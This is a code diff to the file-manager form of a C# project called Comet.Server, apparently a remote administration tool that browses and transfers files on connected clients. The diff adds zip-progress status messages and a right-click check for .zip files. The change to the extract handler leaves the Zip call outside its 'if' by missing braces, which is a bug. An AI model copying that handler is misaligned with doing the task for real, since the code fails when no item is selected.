@@ -10,6 +10,7 @@ using Comet.Server.Networking;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.ServiceModel.Channels;
 using System.Windows.Forms;
 using Process = System.Diagnostics.Process;
 
@@ -87,7 +88,17 @@ namespace Comet.Server.Forms
             _fileManagerHandler.DrivesChanged += DrivesChanged;
             _fileManagerHandler.DirectoryChanged += DirectoryChanged;
             _fileManagerHandler.FileTransferUpdated += FileTransferUpdated;
+            _fileManagerHandler.ZipUpdated += _fileManagerHandler_ZipUpdated;
             MessageHandler.Register(_fileManagerHandler);
+        }
+
+        private void _fileManagerHandler_ZipUpdated(object sender, string Msg)
+        {
+            if (Msg.Contains("completed"))
+            {
+                RefreshDirectory();
+            }
+            stripLblStatus.Text = $"Status: {Msg}";
         }
 
         /// <summary>
@@ -202,7 +213,7 @@ namespace Comet.Server.Forms
 
             var lvi = new ListViewItem(new[]
                     {transfer.Id.ToString(), transfer.Type.ToString(), transfer.Status, transfer.RemotePath})
-                {Tag = transfer, ImageIndex = GetTransferImageIndex(transfer.Status)};
+            { Tag = transfer, ImageIndex = GetTransferImageIndex(transfer.Status) };
 
             lstTransfers.Items.Add(lvi);
         }
@@ -269,7 +280,7 @@ namespace Comet.Server.Forms
         {
             if (lstDirectory.SelectedItems.Count > 0)
             {
-                FileType type = (FileType) lstDirectory.SelectedItems[0].Tag;
+                FileType type = (FileType)lstDirectory.SelectedItems[0].Tag;
 
                 switch (type)
                 {
@@ -324,7 +335,7 @@ namespace Comet.Server.Forms
         {
             foreach (ListViewItem files in lstDirectory.SelectedItems)
             {
-                FileType type = (FileType) files.Tag;
+                FileType type = (FileType)files.Tag;
 
                 if (type == FileType.File)
                 {
@@ -431,7 +442,7 @@ namespace Comet.Server.Forms
         {
             if (!Directory.Exists(_connectClient.Value.DownloadDirectory))
                 Directory.CreateDirectory(_connectClient.Value.DownloadDirectory);
-            
+
             Process.Start(_connectClient.Value.DownloadDirectory);
         }
 
@@ -550,14 +561,34 @@ namespace Comet.Server.Forms
 
         private void zipCompressToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstDirectory.SelectedItems.Count == 1) 
+            if (lstDirectory.SelectedItems.Count == 1)
+            {
+                stripLblStatus.Text = $"Status: Zip Compressing";
                 _fileManagerHandler.Zip(_currentDir + "\\" + lstDirectory.SelectedItems[0].Text, 1);
+            }
         }
 
         private void zipExtractToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (lstDirectory.SelectedItems.Count == 1)
-                _fileManagerHandler.Zip(_currentDir + "\\"+lstDirectory.SelectedItems[0].Text, 2);
+                stripLblStatus.Text = $"Status: Zip Extracting";
+            _fileManagerHandler.Zip(_currentDir + "\\" + lstDirectory.SelectedItems[0].Text, 2);
+        }
+
+        private void lstDirectory_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Right)
+            {
+                if (lstDirectory.SelectedItems.Count == 1)
+                {
+                    string fileName = lstDirectory.SelectedItems[0].Text.ToLower();
+                    if (fileName.Contains(".zip"))
+                        zipExtractToolStripMenuItem.Enabled = true;
+                    else
+                        zipExtractToolStripMenuItem.Enabled = false;
+                }
+            }
+            
         }
     }
 }
